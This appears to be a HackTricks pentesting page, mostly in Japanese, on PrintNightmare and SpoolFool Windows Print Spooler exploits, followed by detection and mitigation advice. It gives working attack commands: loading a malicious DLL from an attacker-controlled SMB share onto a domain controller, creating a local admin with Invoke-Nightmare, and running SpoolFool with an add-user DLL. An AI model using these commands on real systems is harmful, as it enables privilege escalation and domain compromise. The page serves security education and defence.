# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmareは、Windowsの**Print Spooler**サービスに存在する一連の脆弱性の総称であり、**SYSTEMとしての任意コード実行**を可能にします。また、spoolerがRPC経由で到達可能な場合、**ドメインコントローラーやファイルサーバー上でのリモートコード実行（RCE）**も可能です。最も広く悪用されたCVEは、**CVE-2021-1675**（当初はLPEに分類）と**CVE-2021-34527**（完全なRCE）です。その後に発見された**CVE-2021-34481（「Point & Print」）**や**CVE-2022-21999（「SpoolFool」）**などの問題からも、攻撃対象領域が依然として完全には閉じられていないことが分かります。

**driver-based RCE/LPE**ではなく、spooler経由の**authentication coercion / relay**を探している場合は、[printer coercion abuseについての別ページ](printers-spooler-service-abuse.md)を確認してください。このページでは、**SYSTEMとしてdriver / DLLをロードする方法**に焦点を当てています。

---

## 1. 脆弱なコンポーネントとCVE

| Year | CVE | Short name | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|2021年6月のCUで修正されたが、CVE-2021-34527によってバイパスされた|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx`により、認証済みユーザーはリモート共有からdriver DLLをロードできる。2021年8月以降は通常、弱められたPoint & Printポリシーが必要|
|2021|CVE-2021-34481|“Point & Print”|LPE|非管理者ユーザーによる署名されていないdriverのインストール|
|2022|CVE-2022-21999|“SpoolFool”|LPE|任意のディレクトリ作成 → DLL planting – 2021年のpatch適用後も機能する|

これらはすべて、**MS-RPRN / MS-PAR RPC methods**（`RpcAddPrinterDriver`、`RpcAddPrinterDriverEx`、`RpcAsyncAddPrinterDriver`）のいずれか、または**Point & Print**内部のtrust relationshipsを悪用します。

## 2. Exploitation techniques

### 2.1 Remote Domain Controller compromise (CVE-2021-34527)

認証済みだが**非特権**のドメインユーザーは、以下の方法で、リモートspooler（多くの場合DC）上で**NT AUTHORITY\SYSTEM**として任意のDLLを実行できます。
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Popular PoCs include **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#), and Benjamin Delpy’s `misc::printnightmare / lsa::addsid` modules in **mimikatz**.

### 2.2 ローカル権限昇格（サポート対象のすべての Windows、2021-2024）

同じ API を**ローカル**で呼び出して、`C:\Windows\System32\spool\drivers\x64\3\` から driver をロードし、SYSTEM privileges を取得できます:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 パッチ適用済みホストでの最新のトリアージ

完全に更新されたホストでは、Windows が現在、プリンタードライバーのインストールを **administrator-only**（管理者のみ）にデフォルト設定しているため（2021 年 8 月 10 日以降、`RestrictDriverInstallationToAdministrators=1`）、公開されている PrintNightmare PoC は失敗することがよくあります。target に exploit を実行する前に、まず環境で legacy printer deployments のためにこの安全対策が元に戻されていないか確認してください。
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
通常、最も注目すべき脆弱な値は次の2つです。

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

PoC を実行する前に、Linux から対象が関連する print RPC インターフェースを公開していることを素早く確認します：
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
最近の公開ツールの中には、DLLを送信する前に、より安全な **check/list** ワークフローを利用できるものもあります：
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> 低権限ユーザーとして `RPC_E_ACCESS_DENIED` (`0x8001011b`) が発生する場合、通常はトランスポートの失敗ではなく、2021年以降のデフォルト設定によるものです。

> Windows 11 22H2以降およびそれ以降の新しいクライアントビルドでは、リモート印刷はデフォルトで **RPC over TCP** を使用し、**RPC over named pipes** (`\PIPE\spoolss`) は明示的に再有効化しない限り無効になっています。一部の古いPoCやラボのメモでは、依然としてnamed pipeに到達できることを前提としています。

### 2.4 「patched」なネットワークでのPackage Point & Print abuse

多くのエンタープライズ環境では、ヘルプデスクやprint-serverのワークフローで、非管理者ユーザーによるドライバーのインストールや更新が依然として必要だったため、最初の2021年パッチ適用後もポリシーによって **vulnerable** な状態が維持されました。実際のoffensive playbookは次のようになります。

- セキュリティプロンプトが完全に無効化されている場合、**classic arbitrary-DLL PrintNightmare** が依然として最短の経路です。
- `Only use Package Point and Print` が有効な場合、通常はraw DLL dropではなく、**signed package-aware driver** の経路へpivotする必要があります。
- 2024年のresearchでは、**`Package Point and Print - Approved servers` は、それ自体では強固なtrust boundaryではない**ことが示されました。攻撃者が承認済みprint serverの1つについて名前解決をspoofまたはhijackできる場合、ポリシーチェックを満たすmalicious serverへ被害者をredirectできます。
- UNC hardeningとforced RPC-over-SMBを組み合わせても、modern clientでは **RPC over TCPへfallback** する可能性があるため、不安定になる場合があります。

このため、modern PrintNightmare-style exploitationでは、元の2021年PoCを変更せずにreplayするよりも、**enterprise printer deployment policyをabuseする**ことが中心になる場合が多くあります。

### 2.5 SpoolFool (CVE-2022-21999) – 2021年の修正をbypassする

Microsoftの2021年パッチはremote driver loadingをブロックしましたが、**directory permissionsはhardeningしませんでした**。SpoolFoolは`SpoolDirectory`パラメーターをabuseして、`C:\Windows\System32\spool\drivers\`配下にarbitrary directoryを作成し、payload DLLをdropして、spoolerにそれをloadさせます。
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> この exploit は、2022年2月の更新プログラム適用前の、完全にパッチ適用済みの Windows 7 → Windows 11 および Server 2012R2 → 2022 で動作します。

---

## 3. 検知とハンティング

* **PrintService ログ** – *Microsoft-Windows-PrintService/Operational* チャネルを有効化し、**Event ID 316**（driver の追加・更新。通常は DLL 名を含む）を、成功・失敗した試行の両方について監視します。疑わしい spooler module/driver の load failure については、**Event ID 808/811** と組み合わせます。
* **Sysmon** – 親プロセスが **spoolsv.exe** の場合に、`C:\Windows\System32\spool\drivers\*` 内で発生する `Event ID 7`（Image loaded）または `11/23`（File write/delete）。
* **Process lineage** – **spoolsv.exe** が `cmd.exe`、`rundll32.exe`、PowerShell、または予期しない unsigned child process を spawn した場合は、常に alert を発生させます。
* **Network telemetry** – **spoolsv.exe** から attacker-controlled share への予期しない SMB fetch や、print server として動作すべきでない server からの通常とは異なる printer RPC traffic は、いずれも high-signal な手掛かりです。

## 4. Mitigation と hardening

1. **パッチを適用！** – Print Spooler service がインストールされているすべての Windows host に、最新の cumulative update を適用します。
2. **不要な場所では spooler を無効化**します。特に Domain Controller では無効化してください。
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **local printing を許可したまま remote connection を block**します – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`。
4. 次の設定により、**Point & Print を admin-only に維持**します。
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
詳細な guidance は Microsoft KB5005652 にあります。
5. ビジネス要件により `RestrictDriverInstallationToAdministrators=0` を強制する場合、その他の printer policy はすべて **partial mitigation にすぎない**ものとして扱います。最低限、**package-aware driver** を優先し、**Only use Package Point and Print** を有効化し、**Package Point and Print - Approved servers** を明示的な in-forest print server に限定します。
6. 壊れた printer mapping を修正する目的だけで、**printer RPC privacy を rollback しないでください**。`RpcAuthnLevelPrivacyEnabled=0` を設定している環境では、**CVE-2021-1678** 対策として追加された hardening を取り消しているため、通常 engagement 中に追加の scrutiny が必要です。

---

## 5. Related research / tools

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modules
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – `-check`、`-list`、`-delete` mode を備えた標準的な Impacket implementation
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – built-in SMB delivery、multi-target support、`MS-RPRN` / `MS-PAR` の両 mode を備えた wrapper
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – package Point & Print を介した、独自の vulnerable printer driver の悪用
* SpoolFool exploit と write-up
* SpoolFool およびその他の spooler bug 向けの 0patch micropatch

driver を load する代わりに spooler を介して **authentication を coerce** したい場合は、[printer spooler service abuse](printers-spooler-service-abuse.md) に進んでください。

---

## References

* Microsoft – *KB5005652: Manage new Point & Print default driver installation behavior*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
* itm4n – *A Practical Guide to PrintNightmare in 2024*
<https://itm4n.github.io/printnightmare-exploitation/>
* itm4n – *The PrintNightmare is not Over Yet*
<https://itm4n.github.io/printnightmare-not-over/>
{{#include ../../banners/hacktricks-training.md}}
